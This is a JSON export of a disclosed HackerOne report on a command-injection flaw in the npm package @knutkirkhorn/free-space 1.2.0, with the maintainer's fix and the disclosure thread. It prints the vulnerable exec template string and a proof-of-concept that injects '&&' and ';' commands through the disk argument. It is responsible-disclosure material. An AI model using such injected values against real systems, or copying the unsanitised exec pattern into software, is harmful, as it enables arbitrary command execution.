@@ -1,0 +1,532 @@
+{
+  "id": 950192,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTAxOTI=",
+  "url": "https://hackerone.com/reports/950192",
+  "title": "[@knutkirkhorn/free-space] - Command Injection through Lack of Sanitization",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-08-03T13:23:37.941Z",
+  "submitted_at": "2020-08-03T13:23:37.958Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ansuj7",
+    "url": "/ansuj7",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-09-18T12:35:51.099Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-09-18T12:35:51.053Z",
+  "team_member_agreed_on_going_public_at": "2020-08-25T16:18:34.574Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report ```Command Injection``` in the ```free-space``` module.\nIt allows ```arbitrary shell command execution on Unix-based systems```\n\n# Module\n\n**module name:** ```free-space```\n**version:** ```1.2.0```\n**npm page:** `https://www.npmjs.com/package/free-space`\n\n## Module Description\n\n Get the amount of free space for a drive\n\n## Module Stats\n\n24 Weekly Downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue is triggered due to the lack of sanitization of the input parameter of the library's exported anonymous function. \nThe exported function, when given a parameter checks what platform the code is being run on and sends that parameter to a function call in either ```lib/unix.js``` or ```lib/windows/js```.\nThe vulnerability exists in ```lib/unix.js``` which directly uses the user-input parameter: ```disk``` in the template string that ultimately gets exec-ed.\n\nBelow is the library's ```index.js``:\n\n```javascript\n'use strict';\nconst systemDisk = require('system-disk');\nconst windows = require('./lib/windows.js');\nconst unix = require('./lib/unix.js');\n\nmodule.exports = disk => {\n    if (disk === undefined) {\n        return new Promise(resolve => {\n            systemDisk().then(newDisk => {\n                disk = newDisk;\n\n                if (process.platform === 'win32') {\n                    resolve(windows(disk));\n                } else {\n                    resolve(unix(disk));\n                }\n            });\n        });\n    } else {                   // this code executes if a parameter is passed to this function\n        if (typeof disk !== 'string') {\n            throw new TypeError('Invalid input');\n        }\n\n        if (process.platform === 'win32') {    // calls lib/windows.js with the input parameter\n            return windows(disk);\n        }\n\n        return unix(disk);    // calls lib/unix.js with the input parameter\n    }\n};\n```\n\nBelow is the bug in ```lib/unix.js```:\n```javascript\n'use strict';\nconst {exec} = require('child_process');\n\nmodule.exports = disk => {\n    return new Promise((resolve, reject) => {\n        exec(`df -k | grep ^${disk} | awk '{print $4}'`, (err, stdout, stderr) => { // 'disk' is the parameter passed here from the library's exported call\n            if (stderr) {\n                reject(new Error('Something wrong happened'));\n                return;\n            }\n\n            if (stdout.length === 0 || err) {\n                reject(new Error('Could not find disk: ' + disk));\n            }\n\n            resolve(parseInt(stdout, 10) * 1024);\n        });\n    });\n};\n```\nDue to the parameter directly being passed to ```exec```, a ```;```or ```&&``` followed by commands will cause each command after the delimiting character to be executed.\n\n\n## Steps To Reproduce:\n\nCreate testing directory: ```mkdir free-space-poc```\nInstall package: ```npm install (@)knutkirkhorn/free-space```\n\nCreate the following script  - ```test.js``` in the testing directory:\n```javascript\nconst freeSpace = require('@knutkirkhorn/free-space');\n\nfreeSpace(' && echo AMPERSAND_EXEC > ./CODEEXEC').then(bytes => {\n    console.log('AMPERSAND: Free space: ' + bytes + '\\n');\n});\n\nfreeSpace(' ; echo SEMICOLON_EXEC >> ./CODEEXEC').then(bytes => {\n    console.log('SEMICOLON: Free space: ' + bytes + '\\n');\n});\n``` \nExecute with ```nodejs test.js```\n\nList the directory with ```ls```\nYou will see the file ```CODEEXEC``` has been created in the current directory with output from injected commands. ```cat CODEEXEC```\n{F934570}\n\n## Patch\n\nSanitize the ```disk``` parameter before passing it into ```exec``` in ```lib/unix.js``` - Cut out everything after a ```;  and  && ``` and ensure that the disk does exist before calling ```exec```.\n\n## Supporting Material/References:\n\n- Operating System Version: Ubuntu 18.04.4 LTS\n- NodeJS Version: v8.10.0\n- NPM Version: 6.14.7\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N \n\nThank you for your time.\n\n## Impact\n\nCommand Injection can lead to information gathering, system enumeration and further execution of scripts/binaries.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 934570,
+      "file_name": "free-space-poc.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vkd2xLhLfpR92w7PVxApRReR?response-content-disposition=attachment%3B%20filename%3D%22free-space-poc.PNG%22%3B%20filename%2A%3DUTF-8%27%27free-space-poc.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072329Z&X-Amz-Expires=2949&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e7501dd055e8227840a059464fff31cac613824e3c5e0fba5d41d7a0584d98f6",
+      "file_size": 22654,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-24T16:18:34.655Z",
+  "allow_singular_disclosure_after": -94489494.88184975,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "hariprasanna1",
+    "devolution",
+    "haltosan",
+    "xyber_wolf",
+    "younggoon",
+    "tariktarik",
+    "xyzo"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 8835116,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "My apologies, the link to the package on NPM I put in the report is broken. The correct link is: ```https://www.npmjs.com/package/@knutkirkhorn/free-space```",
+      "automated_response": false,
+      "created_at": "2020-08-03T13:28:25.015Z",
+      "updated_at": "2020-08-03T13:28:25.015Z",
+      "actor": {
+        "username": "ansuj7",
+        "cleared": false,
+        "verified": false,
+        "url": "/ansuj7",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8837604,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "The NodeJS Version would not affect this vulnerability, as it is a library-specific issue. Just for reference, I ran the same with the latest version - 14.7.0 and am getting the same results. (I apologize for the additional comments, just trying to make sure I provide all the information needed)",
+      "automated_response": false,
+      "created_at": "2020-08-03T18:01:15.852Z",
+      "updated_at": "2020-08-03T18:01:15.852Z",
+      "actor": {
+        "username": "ansuj7",
+        "cleared": false,
+        "verified": false,
+        "url": "/ansuj7",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8869999,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportTitleUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-06T22:34:02.425Z",
+      "updated_at": "2020-08-06T22:34:02.425Z",
+      "additional_data": {
+        "old_title": "[free-space] - Command Injection through Lack of Sanitization",
+        "new_title": "[@knutkirkhorn/free-space] - Command Injection through Lack of Sanitization"
+      },
+      "actor": {
+        "username": "danielruf",
+        "cleared": false,
+        "verified": false,
+        "url": "/danielruf",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8907361,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi, I wanted to follow up on whether there are any updates on this or if there is any additional information I need to provide? Thank you!",
+      "automated_response": false,
+      "created_at": "2020-08-11T15:17:24.327Z",
+      "updated_at": "2020-08-11T15:17:24.327Z",
+      "actor": {
+        "username": "ansuj7",
+        "cleared": false,
+        "verified": false,
+        "url": "/ansuj7",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8949894,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for reporting this █████. I have contacted the maintainer and invited him to this report.",
+      "automated_response": false,
+      "created_at": "2020-08-16T13:12:05.768Z",
+      "updated_at": "2021-01-20T19:23:48.683Z",
+      "actor": {
+        "username": "danielruf",
+        "cleared": false,
+        "verified": false,
+        "url": "/danielruf",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8971391,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-18T17:52:06.154Z",
+      "updated_at": "2020-08-18T17:52:06.154Z",
+      "actor": {
+        "username": "xyzo",
+        "cleared": false,
+        "verified": false,
+        "url": "/xyzo",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 8972803,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for reporting this and contacting me about it. I really appreciate it and I will look into fixing the vulnerability in the following days.",
+      "automated_response": false,
+      "created_at": "2020-08-18T21:07:55.892Z",
+      "updated_at": "2020-08-18T21:07:55.892Z",
+      "actor": {
+        "username": "xyzo",
+        "cleared": false,
+        "verified": false,
+        "url": "/xyzo",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 9014110,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "The command injection should now be patched in a new version (`1.3.0`) which has been pushed to NPM.\nI decided to remove the user input to the command and rather filter out the line which I was looking for in the command line output.\nPlease let me know if there is still an issue.\nSee [here](https://github.com/Knutakir/free-space/commit/981d862e00481ea43aaad41913c65d4d5f350fa5) for patch commit.",
+      "automated_response": false,
+      "created_at": "2020-08-23T11:48:30.970Z",
+      "updated_at": "2020-08-23T11:48:30.970Z",
+      "actor": {
+        "username": "xyzo",
+        "cleared": false,
+        "verified": false,
+        "url": "/xyzo",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 9014500,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I have tested using the same PoC, the issue has been fixed - there is no command execution now that `df -k` is being called and is being searched through for the string.\nThank you for the quick fix.\n\n@danielruf Shall we assign severity and proceed with the disclosure if @xyzo is aligned?\n\n",
+      "automated_response": false,
+      "created_at": "2020-08-23T13:32:11.974Z",
+      "updated_at": "2020-08-23T13:32:11.974Z",
+      "actor": {
+        "username": "ansuj7",
+        "cleared": false,
+        "verified": false,
+        "url": "/ansuj7",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 9015241,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "A severity score would be great. Can you set one that fits the reported issue @ansuj?",
+      "automated_response": false,
+      "created_at": "2020-08-23T16:57:36.356Z",
+      "updated_at": "2020-08-23T16:57:36.356Z",
+      "actor": {
+        "username": "danielruf",
+        "cleared": false,
+        "verified": false,
+        "url": "/danielruf",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 9015887,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-23T18:23:11.424Z",
+      "updated_at": "2020-08-23T18:23:11.424Z",
+      "additional_data": {
+        "old_severity": null,
+        "new_severity": "Medium (6.8)",
+        "old_severity_id": null,
+        "new_severity_id": 826542
+      },
+      "actor": {
+        "username": "ansuj7",
+        "cleared": false,
+        "verified": false,
+        "url": "/ansuj7",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 9015891,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Sure, @danielruf, I have entered the severity assigned by the calculator.",
+      "automated_response": false,
+      "created_at": "2020-08-23T18:24:58.178Z",
+      "updated_at": "2020-08-23T18:24:58.178Z",
+      "actor": {
+        "username": "ansuj7",
+        "cleared": false,
+        "verified": false,
+        "url": "/ansuj7",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 9036177,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-25T16:18:28.061Z",
+      "updated_at": "2020-08-25T16:18:28.061Z",
+      "actor": {
+        "username": "danielruf",
+        "cleared": false,
+        "verified": false,
+        "url": "/danielruf",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "ansuj7",
+        "url": "/ansuj7"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 9036178,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-25T16:18:34.594Z",
+      "updated_at": "2020-08-25T16:18:34.594Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "danielruf",
+        "cleared": false,
+        "verified": false,
+        "url": "/danielruf",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 9256142,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-09-18T12:35:51.070Z",
+      "updated_at": "2020-09-18T12:35:51.070Z",
+      "actor": {
+        "username": "ansuj7",
+        "cleared": false,
+        "verified": false,
+        "url": "/ansuj7",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 9256143,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-09-18T12:35:51.123Z",
+      "updated_at": "2020-09-18T12:35:51.123Z",
+      "actor": {
+        "username": "ansuj7",
+        "cleared": false,
+        "verified": false,
+        "url": "/ansuj7",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
